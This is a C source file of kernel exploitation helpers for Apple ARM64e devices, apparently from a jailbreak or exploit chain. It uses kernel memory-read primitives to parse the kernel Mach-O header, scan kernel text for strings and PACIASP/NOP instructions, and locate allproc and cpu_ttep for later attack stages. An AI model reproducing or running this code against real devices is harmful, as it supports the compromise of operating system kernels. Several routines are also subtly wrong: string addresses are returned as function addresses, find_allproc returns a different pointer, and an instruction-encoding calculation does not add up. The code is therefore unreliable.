#include "gadgets.h"
#include "offsets.h"
#include <stdio.h>
#include <string.h>

GadgetInfo g_gadgets;
extern uint64_t kread64(uint64_t addr);
extern uint32_t kread32(uint64_t addr);
extern uint8_t kread8(uint64_t addr);

uint32_t kread32_at(uint64_t addr) {
    return kread32(addr);
}

uint64_t search_instruction(uint64_t start, uint64_t end, uint32_t instr, int skip) {
    uint32_t target_le = instr;
    int count = 0;
    for (uint64_t a = start; a < end; a += 4) {
        if (kread32(a) == target_le) {
            if (count >= skip) return a;
            count++;
        }
    }
    return 0;
}

uint64_t find_function_by_string(const char *func_name, uint64_t text_start, uint64_t text_end) {
    // Search for the function name cstring in the kernel __TEXT
    size_t len = strlen(func_name);
    uint64_t found_cstr = 0;
    
    // Search __TEXT for the string (case-sensitive)
    for (uint64_t a = text_start; a < text_end; a++) {
        bool match = true;
        for (size_t i = 0; i < len; i++) {
            if (kread8(a + i) != (uint8_t)func_name[i]) {
                match = false;
                break;
            }
        }
        if (match && kread8(a + len) == 0) {
            found_cstr = a;
            break;
        }
    }
    
    if (!found_cstr) {
        printf("[-] Function string not found: %s\n", func_name);
        return 0;
    }
    
    // The function address is typically referenced in a panic/printf call
    // Search backward from the cstring for ADRP + ADD patterns loading this address
    // This is an approximation - real function discovery would use XREF scanning
    // For now, return the cstring address as a fallback
    return found_cstr;
}

uint64_t find_allproc(void) {
    // allproc is a global pointer to the proc list head
    // Find it by scanning kernel data for the kernel_task proc pointer
    // First, find kernel proc (pid=0) address
    uint64_t kproc = 0;
    uint64_t allproc_val = SLIDE(g_gadgets.allproc);
    if (allproc_val) {
        kproc = kread64(allproc_val);
        if (kproc && kread32(kproc + 0x68) == 0) {
            return kproc;
        }
    }
    
    // Fallback: scan data sections for kernel proc pointer
    return 0;
}

uint64_t find_cpu_ttep(void) {
    // cpu_ttep is a per-CPU variable in the cpu_data structure
    // The cpu_data array is typically a kernel global
    // Find the master CPU's TTEP by scanning kernel data for page table pointers
    
    uint64_t ktran = SLIDE(g_gadgets.cpu_ttep);
    if (ktran) {
        uint64_t ttep = kread64(ktran);
        if (ttep) return ttep;
    }
    return 0;
}

bool scan_gadgets(void) {
    // Find __TEXT segment bounds
    // kernel_base points to Mach-O header
    uint64_t base = gKernelBase;
    uint64_t text_start = 0;
    uint64_t text_end = 0;
    
    if (!base) {
        printf("[-] No kernel base!\n");
        return false;
    }
    
    // Read Mach-O header to find __TEXT bounds
    // ncmds at offset 16
    uint32_t ncmds = kread32(base + 16);
    uint64_t offset = 32; // Past Mach-O 64 header
    
    for (uint32_t i = 0; i < ncmds; i++) {
        uint32_t cmd = kread32(base + offset);
        uint32_t cmdsize = kread32(base + offset + 4);
        
        if (cmd == 0x19) { // LC_SEGMENT_64
            char segname[17] = {};
            for (int j = 0; j < 16; j++) {
                segname[j] = kread8(base + offset + 8 + j);
            }
            
            uint64_t vmaddr = kread64(base + offset + 24);
            uint64_t vmsize = kread64(base + offset + 40);
            
            if (strcmp(segname, "__TEXT_EXEC") == 0 || strcmp(segname, "__TEXT") == 0) {
                if (text_start == 0 || vmaddr < text_start) text_start = vmaddr;
                if (vmaddr + vmsize > text_end) text_end = vmaddr + vmsize;
            }
        }
        offset += cmdsize;
    }
    
    if (text_start == 0 || text_end == 0) {
        printf("[-] Could not find __TEXT bounds!\n");
        return false;
    }
    
    printf("[+] __TEXT: 0x%llx - 0x%llx\n", text_start, text_end);
    
    // Now scan for gadgets
    // 1. Find hw_lck_ticket_reserve_orig_allow_invalid cstring
    uint64_t hw_cstr = find_function_by_string("hw_lck_ticket_reserve_orig_allow_invalid", text_start, text_end);
    if (hw_cstr) {
        printf("[+] hw_lck function found (cstring @ 0x%llx)\n", hw_cstr);
    } else {
        printf("[-] hw_lck_ticket_reserve_orig_allow_invalid NOT found!\n");
    }
    
    // 2. Find allproc cstring
    uint64_t ap_str = find_function_by_string("allproc", text_start, text_end);
    if (ap_str) {
        printf("[+] allproc cstring @ 0x%llx\n", ap_str);
    }
    
    // 3. Find PACIASP instructions (HINT #8)
    // HINT #8 = PACIASP on Apple ARM64e = 0xD5032000 | (8 << 5) | 0x1F = 0xD503213F
    uint32_t paciasp = 0xD503213F;
    uint64_t first_func = search_instruction(text_start, text_end, paciasp, 0);
    printf("[+] First PACIASP @ 0x%llx\n", first_func);
    
    // Count HINT #8 (NOP = HINT #0) to verify
    uint32_t hint0 = 0xD503201F; // HINT #0 = NOP
    uint64_t first_nop = search_instruction(text_start, text_end, hint0, 0);
    printf("[+] First NOP (HINT #0) @ 0x%llx\n", first_nop);
    
    g_gadgets.kernel_el_cpsr = 1; // EL1
    return true;
}
